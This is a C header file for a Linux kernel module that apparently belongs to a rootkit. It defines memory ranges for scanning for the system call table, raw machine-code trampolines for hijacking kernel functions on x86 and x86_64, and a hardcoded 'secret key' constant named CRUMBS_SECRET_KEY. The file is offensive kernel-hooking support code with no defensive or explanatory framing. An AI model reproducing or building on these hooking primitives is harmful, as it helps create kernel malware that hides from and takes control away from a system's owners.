#ifndef _COMMON_H_
#define _COMMON_H_

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
/* #include <asm/semaphore.h> */
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");

#define DEBUG 1

#define DEFAULT_PATH "/"

#define CRUMBS_SECRET_KEY "ABCDEF"

#ifdef DEBUG
    #define dbg(fmt, ...)               \
    do {                                \
        printk(fmt, ##__VA_ARGS__);     \
    } while (0)
#else
    #define dbg(fmt, ...)
#endif /* DEBUG */

#if defined(__i386__) /* x86 */
    #define SCT_START_CHECK 0xc0000000
    #define SCT_END_CHECK   0xd0000000
    typedef unsigned int ptr_t;
#else /* x86_64 */
    #define SCT_START_CHECK 0xffffffff81000000
    #define SCT_END_CHECK   0xffffffffa2000000
    typedef unsigned long ptr_t;
#endif /* arch */

#if defined(__i386__) /* x86 */
    #define CODE_SIZE 6
    #define HIJACKED_CODE "\x68\x00\x00\x00\x00\xc3" /* push addr; ret; */
    #define POINTER_OFFSET 1
#else /* x86_64 */
    #define CODE_SIZE 12
    #define HIJACKED_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" /* mov addr, %rax; jmp *%rax; */
    #define POINTER_OFFSET 2
#endif

#endif /* _COMMON_H_ */